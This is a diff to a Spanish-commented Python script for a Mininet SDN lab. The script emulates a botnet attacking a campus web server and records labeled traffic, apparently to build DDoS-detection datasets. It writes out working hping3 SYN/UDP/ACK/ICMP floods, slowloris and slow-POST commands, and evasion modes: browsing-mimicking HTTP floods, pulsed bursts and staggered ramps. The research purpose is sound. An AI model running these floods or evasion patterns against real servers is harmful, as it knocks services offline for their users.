@@ -14,6 +14,7 @@ Uso (con Ryu ya en 127.0.0.1:6653):
 import csv
 import json
 import os
+import re
 import shutil
 import subprocess
 import sys
@@ -29,21 +30,33 @@ from roles import (
     BROWSE_PAUSE_MIN,
     C2_NAME,
     CORE_SWITCH,
+    ACK_PPS,
+    ATTACK_MODE,
+    ATTACK_PROFILE,
+    HTTP_FLOOD_MIMIC,
     HTTP_FLOOD_PAUSE,
     HTTP_FLOOD_WORKERS,
     ICMP_PPS,
     PAGES,
+    MULTIVECTOR_ATTACKS,
+    PULSE_OFF_S,
+    PULSE_ON_S,
+    RAMP_S,
     SCENARIOS,
     SLOWLORIS_CONNS,
+    SLOWPOST_CONNS,
     SYN_PPS,
+    UDP_PPS,
     VICTIM_IP,
     VICTIM_NAME,
     bots,
+    onset_for,
+    ramp_delays,
     run_config,
     students,
     tagged,
 )
-from topo import build
+from topo import build, use_kernel_dp
 
 PROBE = 'salud-u1'
 
@@ -67,18 +80,35 @@ def _install_scripts(victim):
     _write_script('/tmp/browse.sh', '''#!/bin/sh
 while true; do
   : campus_browse
-  page=$(awk -v seed="$RANDOM" 'BEGIN{srand(seed); n=split("%s", p, " "); print p[int(rand()*n)+1]}')
+  page=$(awk -v seed="$(od -An -N4 -tu4 /dev/urandom)" 'BEGIN{srand(seed); n=split("%s", p, " "); print p[int(rand()*n)+1]}')
   curl -s -o /dev/null --max-time 3 "http://%s${page}"
-  sleep $(awk -v min=%s -v max=%s -v seed="$RANDOM" 'BEGIN{srand(seed); print min+rand()*(max-min)}')
+  sleep $(awk -v min=%s -v max=%s -v seed="$(od -An -N4 -tu4 /dev/urandom)" 'BEGIN{srand(seed); print min+rand()*(max-min)}')
 done
 ''' % (pages, victim, BROWSE_PAUSE_MIN, BROWSE_PAUSE_MAX))
+    # HTTP flood. En pulsos, cada ciclo martilla PULSE_ON_S segundos y calla
+    # PULSE_OFF_S. Con HTTP_FLOOD_MIMIC pide paginas al azar con pausas
+    # irregulares (+-50 %), como un alumno muy activo, en vez de '/' fijo.
+    on_s, off_s = _pulse_window()
+    if HTTP_FLOOD_MIMIC:
+        target = ('page=$(awk -v seed="$(od -An -N4 -tu4 /dev/urandom)" \'BEGIN{srand(seed); n=split("%s", p, " "); '
+                  'print p[int(rand()*n)+1]}\')\n    url="http://%s${page}"' % (pages, victim))
+        pause = ('$(awk -v b=%s -v seed="$(od -An -N4 -tu4 /dev/urandom)" \'BEGIN{srand(seed); print b*(0.5+rand())}\')'
+                 % HTTP_FLOOD_PAUSE)
+    else:
+        target = 'url="http://%s/"' % victim
+        pause = str(HTTP_FLOOD_PAUSE)
     _write_script('/tmp/httpflood.sh', '''#!/bin/sh
 while true; do
   : httpflood
-  curl -s -o /dev/null --max-time 2 "http://%s/"
-  sleep %s
+  end=$(( $(date +%%s) + %d ))
+  while [ "$(date +%%s)" -lt "$end" ]; do
+    %s
+    curl -s -o /dev/null --max-time 2 "$url"
+    sleep %s
+  done
+  %s
 done
-''' % (victim, HTTP_FLOOD_PAUSE))
+''' % (on_s, target, pause, 'sleep %d' % off_s if off_s else ':'))
     # SYN e ICMP envueltos en un bucle con timeout: si el generador se cuelga
     # o muere, timeout lo mata a los 5 s y el bucle lo relanza, asi el flood
     # se sostiene toda la medicion.
@@ -89,54 +119,122 @@ done
     # contador del flujo se congela a los ~9 s). El ping del kernel sostiene
     # el ritmo toda la corrida. El intervalo sale de ICMP_PPS (acotado para
     # no tumbar el emulador).
+    #
+    # En modo pulsos el mismo timeout marca el tramo ON (PULSE_ON_S) y un
+    # sleep el tramo OFF (PULSE_OFF_S): la botnet ataca a rafagas.
     icmp_interval = max(0.02, 1.0 / max(ICMP_PPS, 1))
-    _write_script('/tmp/synfloodloop.sh', '''#!/bin/sh
+    _write_script('/tmp/synfloodloop.sh', _flood_loop(
+        'synflood', 'hping3 -S -p 80 %s %s' % (_hping_flag(SYN_PPS), victim)))
+    _write_script('/tmp/icmpfloodloop.sh', _flood_loop(
+        'icmpflood', 'ping -i %s -q %s' % (icmp_interval, victim)))
+    # UDP y ACK: mismo patron de bucle con timeout que SYN/ICMP, por la
+    # misma razon (hping3 puede dejar de empujar paquetes si no se relanza).
+    _write_script('/tmp/udpfloodloop.sh', _flood_loop(
+        'udpflood', 'hping3 --udp -p 80 %s %s' % (_hping_flag(UDP_PPS), victim)))
+    _write_script('/tmp/ackfloodloop.sh', _flood_loop(
+        'ackflood', 'hping3 -A -p 80 %s %s' % (_hping_flag(ACK_PPS), victim)))
+
+
+def _pulse_window():
+    """(segundos ON, segundos OFF) de cada ciclo. Fuera de pulsos: ON
+    'infinito' (10^9 s) y OFF 0, que es el ataque continuo de siempre."""
+    if ATTACK_MODE == 'pulsos':
+        return PULSE_ON_S, PULSE_OFF_S
+    return 10 ** 9, 0
+
+
+def _flood_loop(marker, command):
+    """Bucle que relanza el generador. Continuo: timeout 5 y vuelta a
+    empezar (como antes). Pulsos: timeout ON y luego sleep OFF."""
+    on_s, off_s = _pulse_window()
+    seg = min(on_s, 5) if not off_s else on_s
+    rest = '  sleep %d\n' % off_s if off_s else ''
+    return '''#!/bin/sh
 while true; do
-  : synflood
-  timeout 5 hping3 -S -p 80 %s %s >/dev/null 2>&1
-done
-''' % (_hping_flag(SYN_PPS), victim))
-    _write_script('/tmp/icmpfloodloop.sh', '''#!/bin/sh
-while true; do
-  : icmpflood
-  timeout 5 ping -i %s -q %s >/dev/null 2>&1
-done
-''' % (icmp_interval, victim))
+  : %s
+  timeout %d %s >/dev/null 2>&1
+%sdone
+''' % (marker, seg, command, rest)
 
 
 def _hping_flag(pps):
     return '-i u%d' % int(1000000 / pps)
 
 
+def _slow_cmd(mode_flag, conns, url, seconds, host):
+    """slowhttptest para Slowloris (-H) o Slow POST (-B). En pulsos se corta
+    a los PULSE_ON_S s (se cierran las conexiones) y vuelve tras PULSE_OFF_S."""
+    method = '-t GET ' if mode_flag == '-H' else ''
+    on_s, off_s = _pulse_window()
+    log = '/tmp/%s.attack.log' % host.name
+    if not off_s:
+        return ('slowhttptest -c %d %s -i 10 -r 20 %s-u %s -x 24 -p 3 -l %d > %s 2>&1'
+                % (conns, mode_flag, method, url, seconds, log))
+    return ('while true; do timeout %d slowhttptest -c %d %s -i 10 -r 20 %s-u %s -x 24 -p 3 -l %d '
+            '> %s 2>&1; sleep %d; done' % (on_s, conns, mode_flag, method, url, on_s + 5, log, off_s))
+
+
 def start_browse(host):
-    host.cmd('sh /tmp/browse.sh > /tmp/%s.browse.log 2>&1 &' % host.name)
+    """Arranca el bucle de navegacion y devuelve su PID (para poder pararlo
+    solo en esa PC: los hosts de Mininet comparten el espacio de PIDs, un
+    pkill por nombre mataria el de todos)."""
+    out = host.cmd('sh /tmp/browse.sh > /tmp/%s.browse.log 2>&1 & echo PID:$!' % host.name)
+    found = re.search(r'PID:(\d+)', out or '')
+    return found.group(1) if found else ''
 
 
-def start_attack(host, scenario, victim, duration):
+def attack_commands(host, scenario, victim, duration):
+    """Comandos de shell (cada uno ira en segundo plano) que lanza una PC
+    infectada para `scenario`."""
+    log = '/tmp/%s.attack.log' % host.name
     if scenario == 'synflood':
-        host.cmd('sh /tmp/synfloodloop.sh > /tmp/%s.attack.log 2>&1 &' % host.name)
-    elif scenario == 'httpflood':
+        return ['sh /tmp/synfloodloop.sh > %s 2>&1' % log]
+    if scenario == 'httpflood':
         # Un solo curl por PC no llena el cupo: cada una abre varios a la vez.
-        for worker in range(HTTP_FLOOD_WORKERS):
-            host.cmd(
-                'sh /tmp/httpflood.sh > /tmp/%s.attack.%d.log 2>&1 &'
-                % (host.name, worker)
-            )
-    elif scenario == 'slowloris':
-        host.cmd(
-            'slowhttptest -c %d -H -i 10 -r 20 -t GET -u http://%s/ -x 24 -p 3 -l %d '
-            '> /tmp/%s.attack.log 2>&1 &'
-            % (SLOWLORIS_CONNS, victim, duration + 15, host.name)
-        )
-    elif scenario == 'icmpflood':
-        host.cmd('sh /tmp/icmpfloodloop.sh > /tmp/%s.attack.log 2>&1 &' % host.name)
+        return ['sh /tmp/httpflood.sh > /tmp/%s.attack.%d.log 2>&1' % (host.name, w)
+                for w in range(HTTP_FLOOD_WORKERS)]
+    if scenario == 'slowloris':
+        return [_slow_cmd('-H', SLOWLORIS_CONNS, 'http://%s/' % victim, duration + 15, host)]
+    if scenario == 'icmpflood':
+        return ['sh /tmp/icmpfloodloop.sh > %s 2>&1' % log]
+    if scenario == 'udpflood':
+        return ['sh /tmp/udpfloodloop.sh > %s 2>&1' % log]
+    if scenario == 'ackflood':
+        return ['sh /tmp/ackfloodloop.sh > %s 2>&1' % log]
+    if scenario == 'slowpost':
+        # RUDY: igual que Slowloris pero en el cuerpo de un POST (-B), no en
+        # las cabeceras (-H). Va contra /login, el unico path que el portal
+        # acepta en POST (webserver.py); contra otro path el 404 llega antes
+        # de que el cuerpo lento tenga efecto, y la conexion no se sostiene.
+        return [_slow_cmd('-B', SLOWPOST_CONNS, 'http://%s/login' % victim, duration + 15, host)]
+    return []
+
+
+def start_attack(host, scenario, victim, duration, delay_s=0, browse_pid=''):
+    """Lanza el ataque de una PC infectada. Un script propio por PC espera
+    `delay_s` (modo rampa), corta su navegacion y arranca el ataque: hasta
+    ese momento la PC sigue navegando como un alumno."""
+    cmds = attack_commands(host, scenario, victim, duration)
+    lines = ['#!/bin/sh']
+    if delay_s > 0:
+        lines.append('sleep %d' % delay_s)
+    if browse_pid:
+        lines.append('kill %s 2>/dev/null' % browse_pid)
+    lines += ['%s &' % c for c in cmds]
+    lines.append('wait')
+    path = '/tmp/%s.attack.sh' % host.name
+    _write_script(path, '\n'.join(lines) + '\n')
+    host.cmd('sh %s > /dev/null 2>&1 &' % path)
 
 
 def stop_host(host):
+    host.cmd('pkill -f "attack\\.sh" 2>/dev/null || true')
     host.cmd('pkill -f browse.sh 2>/dev/null || true')
     host.cmd('pkill -f httpflood.sh 2>/dev/null || true')
     host.cmd('pkill -f synfloodloop.sh 2>/dev/null || true')
     host.cmd('pkill -f icmpfloodloop.sh 2>/dev/null || true')
+    host.cmd('pkill -f udpfloodloop.sh 2>/dev/null || true')
+    host.cmd('pkill -f ackfloodloop.sh 2>/dev/null || true')
     host.cmd('pkill -f hping3 2>/dev/null || true')
     host.cmd('pkill -f slowhttptest 2>/dev/null || true')
 
@@ -217,13 +315,16 @@ def main():
 
     scenario = sys.argv[1]
     duration = int(sys.argv[2]) if len(sys.argv) > 2 else 120
-    name = tagged(scenario)
-    out = os.path.abspath(sys.argv[3]) if len(sys.argv) > 3 else os.path.join(raw_dir(), '%s.pcap' % name)
+    # run_name y no "name": los bucles de hosts de mas abajo reutilizan "name".
+    run_name = tagged(scenario)
+    out = os.path.abspath(sys.argv[3]) if len(sys.argv) > 3 else os.path.join(raw_dir(), '%s.pcap' % run_name)
     os.makedirs(os.path.dirname(out), exist_ok=True)
-    metrics_path = os.path.join(metrics_dir(), '%s_interno.csv' % name)
+    metrics_path = os.path.join(metrics_dir(), '%s_interno.csv' % run_name)
     meta_path = os.path.splitext(out)[0] + '.meta.json'
-    tmp_out = '/tmp/%s.pcap' % name
+    tmp_out = '/tmp/%s.pcap' % run_name
 
+    # Segundo en que arranca el ataque (0 en baseline: no hay ataque).
+    onset = 0 if scenario == 'baseline' else onset_for(duration)
     meta = {
         'scenario': scenario,
         'victim': VICTIM_IP,
@@ -231,10 +332,32 @@ def main():
         'bots': [ip for _name, ip in bots()],
         'benign_client': BENIGN_CLIENT_IP,
         'pages': list(PAGES),
+        'duration_s': duration,
+        'onset_planned_s': onset,
+        'datapath': 'kernel' if use_kernel_dp() else 'userspace',
+        # Se llenan cuando arranca el ataque; baseline los deja en None.
+        # Los flujos y ventanas se etiquetan como ataque solo desde aqui.
+        'capture_start_ts': None,
+        'attack_start_ts': None,
+        'attack_start_elapsed': None,
     }
     meta.update(run_config())
-    with open(meta_path, 'w') as fh:
-        json.dump(meta, fh, indent=2)
+
+    # multivector: cada infectada lanza uno de los ataques elegidos (se
+    # reparten por turnos, asi cada laboratorio ve mas de un vector). El mapa
+    # IP -> ataque queda en el meta.json y es lo que usa pcap_to_csv.py para
+    # etiquetar cada flujo con SU ataque; la ventana lleva 'multivector'.
+    bot_attack = {}
+    if scenario == 'multivector':
+        for i, (bot_name, bot_ip) in enumerate(bots()):
+            bot_attack[bot_name] = MULTIVECTOR_ATTACKS[i % len(MULTIVECTOR_ATTACKS)]
+        meta['bot_attacks'] = {ip: bot_attack[nm] for nm, ip in bots()}
+
+    def write_meta():
+        with open(meta_path, 'w') as fh:
+            json.dump(meta, fh, indent=2)
+
+    write_meta()
 
     setLogLevel('info')
     info('*** Escenario %s durante %ss\n' % (scenario, duration))
@@ -262,19 +385,51 @@ def main():
         for name, _ip in students():
             start_browse(net.get(name))
 
-        if scenario == 'baseline':
-            info('*** PCs infectadas tambien navegan: todavia no hay ataque\n')
-            for name, _ip in bots():
-                start_browse(net.get(name))
-        else:
+        # Todas las PCs infectadas arrancan navegando como cualquier alumno.
+        # En un ataque dejan de navegar y atacan recien en el segundo `onset`.
+        info('*** PCs infectadas navegando como alumnos (todavia sin ataque)\n')
+        bot_browse = {}
+        for name, _ip in bots():
+            bot_browse[name] = start_browse(net.get(name))
+
+        def launch_attack(elapsed_now):
+            """La orden del C2: las infectadas dejan de navegar y atacan.
+            Devuelve el instante (epoch) desde el cual su trafico es ataque."""
+            # Cada infectada corta su propia navegacion en su script de
+            # ataque (al instante, o tras su retraso en modo rampa).
+            attack_ts = time.time()
+            # Antes el C2 hacia ping a cada infectada para "ordenar" el ataque:
+            # eso metia 10 entradas nuevas a la tabla OpenFlow justo en el
+            # instante del cambio de etiqueta, y sdn_core_flows terminaba
+            # separando BENIGN/ataque por ese ping, no por el trafico real.
+            # El C2 sigue en la topologia (es quien controla las infectadas),
+            # pero ya no genera trafico propio al arrancar el ataque.
             info('*** C2 (%s) ordena el ataque a las PCs infectadas\n' % C2_NAME)
-            c2 = net.get(C2_NAME)
-            for _name, ip in bots():
-                c2.cmd('ping -c 1 -W 1 %s >/dev/null 2>&1 &' % ip)
-            time.sleep(2)
-            info('*** Ataque %s desde %d PCs hacia %s\n' % (scenario, len(meta['bots']), VICTIM_IP))
+            info('*** Ataque %s desde %d PCs hacia %s (segundo %d de %d)\n' % (
+                scenario, len(meta['bots']), VICTIM_IP, elapsed_now, duration))
+            if bot_attack:
+                for vector in MULTIVECTOR_ATTACKS:
+                    n = sum(1 for v in bot_attack.values() if v == vector)
+                    info('    vector %s: %d PCs\n' % (vector, n))
+            info('*** Perfil %s, forma %s%s\n' % (
+                ATTACK_PROFILE, ATTACK_MODE,
+                ' (ON %ds / OFF %ds)' % (PULSE_ON_S, PULSE_OFF_S) if ATTACK_MODE == 'pulsos'
+                else ' (%d PCs en %ds)' % (len(meta['bots']), RAMP_S) if ATTACK_MODE == 'rampa'
+                else ''))
+            delays = ramp_delays([name for name, _ip in bots()])
             for name, _ip in bots():
-                start_attack(net.get(name), scenario, VICTIM_IP, duration)
+                start_attack(net.get(name), bot_attack.get(name, scenario),
+                             VICTIM_IP, max(duration - elapsed_now, 1),
+                             delay_s=delays[name], browse_pid=bot_browse.get(name, ''))
+            meta['bot_delays_s'] = {ip: delays[name] for name, ip in bots()}
+            meta['attack_start_ts'] = attack_ts
+            meta['attack_start_elapsed'] = elapsed_now + 1
+            write_meta()
+
+        attack_pending = scenario != 'baseline'
+        if attack_pending and onset == 0:
+            launch_attack(0)
+            attack_pending = False
 
         header = [
             'timestamp', 'elapsed_s', 'probe_http_code', 'probe_latency_ms',
@@ -297,6 +452,8 @@ def main():
             writer = csv.writer(fh)
             writer.writerow(header)
             deadline = time.time() + duration
+            meta['capture_start_ts'] = time.time()
+            write_meta()
             elapsed = 0
             while time.time() < deadline:
                 elapsed += 1
@@ -339,6 +496,11 @@ def main():
                     _conns(www), flows, benign_pps, benign_bps,
                 ])
                 fh.flush()
+                # El ataque arranca al final de la muestra `onset`: la muestra
+                # siguiente es la primera que ya contiene trafico de ataque.
+                if attack_pending and elapsed >= onset:
+                    launch_attack(elapsed)
+                    attack_pending = False
                 remain = 1.0 - (time.time() - sample_started)
                 if remain > 0:
                     time.sleep(min(remain, max(0.0, deadline - time.time())))
@@ -347,7 +509,7 @@ def main():
         avg_latency = ('%.1f' % (sum(latencies) / len(latencies))) if latencies else ''
         avg_pps = ('%.1f' % (sum(pps_values) / len(pps_values))) if pps_values else ''
         row = {
-            'scenario': name,
+            'scenario': run_name,
             'duration_s': duration,
             'samples': samples,
             'http_200': ok_n,
